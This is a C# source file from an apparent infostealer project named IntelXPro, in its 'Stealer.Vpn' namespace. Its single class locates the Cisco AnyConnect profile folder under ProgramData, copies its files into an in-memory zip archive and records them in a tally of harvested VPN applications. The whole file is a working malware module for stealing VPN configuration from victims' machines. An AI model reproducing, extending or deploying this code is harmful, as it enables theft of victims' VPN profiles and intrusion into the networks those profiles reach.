using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Vpn
{
    internal class Cisco : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Cisco", "Cisco AnyConnect Secure Mobility Client", "Profile");
            if (Directory.Exists(text))
            {
                string text2 = "Cisco";
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "Cisco AnyConnect";
                zip.AddDirectoryFiles(text, text2);
                counterApplications.Files.Add(text + " => " + text2);
                counterApplications.Files.Add(text2);
                counter.Vpns.Add(counterApplications);
            }
        }
    }

}
